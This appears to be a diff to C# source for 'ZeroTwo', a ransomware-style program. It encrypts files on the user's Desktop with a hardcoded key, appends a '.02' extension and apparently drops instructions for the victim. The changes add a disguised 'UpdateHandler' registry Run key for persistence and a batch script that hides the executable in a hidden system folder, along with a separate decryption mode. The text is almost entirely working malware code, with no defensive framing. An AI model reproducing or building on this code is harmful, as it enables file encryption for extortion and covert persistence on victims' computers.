@@ -3,16 +3,34 @@ using System.IO;
 using System.Security.Cryptography;
 using System.Reflection;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace ZeroTwo.src {
     class ZeroTwo {
         private const string EXT = ".02";
 
-        public static void Main() {
-            Exec();
-            ReleaseIstructions();
-            SelfDel();
-            OpenImage();
+        private const int ENC = 0;
+        private const int DEC = 1;
+
+        public static void Main(string[] args) {
+
+            if (args.Length == 0) {
+                Inject();
+                SelfDel();
+                OpenImage();
+            } else {
+                int op = int.Parse(args[0]);
+                Exec(op);
+                if (op == ENC) {
+                    ReleaseIstructions();
+                }
+            }
+        }
+
+        private static void Inject() {
+            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+            key.SetValue("UpdateHandler", "C:\\Updates\\ZeroTwo.exe 0");
+            key.Close();
         }
 
         private static void OpenImage() {
@@ -46,27 +64,36 @@ namespace ZeroTwo.src {
 
         private static void SelfDel() {
             string batchCommands = string.Empty;
+            string destFolder = "C:\\Updates";
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
 
             batchCommands += "@ECHO OFF\n";                         // Do not show any output
             batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
-            batchCommands += "echo j | del /F ";                    // Delete the executeable
-            batchCommands += "\"" + exePath + "\"" + "\n";
+            batchCommands += "echo j | mkdir " + "\"" + destFolder + "\"" + "\n";                    // Create dest folder
+            batchCommands += "echo j | move ";                    // Move the executeable
+            batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\ZeroTwo.exe" + "\"" + "\n";
+            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";                    // Set attributes to folder
             batchCommands += "echo j | del del.bat";    // Delete this bat file
 
             File.WriteAllText("del.bat", batchCommands);
             Process.Start("del.bat");
         }
 
-        private static void Exec() {
+        private static void Exec(int op) {
             string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
             string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);
-            foreach (string file in files) {
-                if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
-                    ToggleCipher(true, file, file + EXT, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+
+            if (op == ENC) {
+                foreach (string file in files) {
+                    if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
+                        ToggleCipher(true, file, file + EXT, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+                    }
                 }
-                if (Path.GetExtension(file).Equals(EXT)) {
-                    //ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+            } else if (op == DEC) {
+                foreach (string file in files) {
+                    if (Path.GetExtension(file).Equals(EXT)) {
+                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
+                    }
                 }
             }
         }
